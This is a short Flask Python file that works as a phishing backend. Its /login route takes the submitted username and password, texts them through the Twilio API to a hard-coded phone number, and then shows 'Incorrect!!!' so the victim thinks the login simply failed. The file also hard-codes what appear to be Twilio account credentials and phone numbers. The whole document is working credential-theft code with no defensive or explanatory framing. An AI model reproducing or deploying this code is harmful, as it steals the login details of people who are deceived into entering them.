from flask import Flask, render_template, request
import smtplib
from twilio.rest import Client

app = Flask(__name__)

SID = "ACc121b5096c49f4917c92ae77d25e9dcf"
TOKEN = "33debc1ebdb182f98e298f2c9c51c7f6"


@app.route('/')
def home():
	return render_template("index.html")


@app.route("/login", methods=["POST"])
def get_data():
	name = request.form["username"]
	password = request.form["password"]
	client = Client(SID, TOKEN)
	message = client.messages \
		.create(
		body=f"Name:{name}|Password:{password}",
		from_="+18653441848",
		to="+918780271174"
	)
	return "<h1>Incorrect!!!</h1>"


if __name__ == "__main__":
	app.run(debug=True)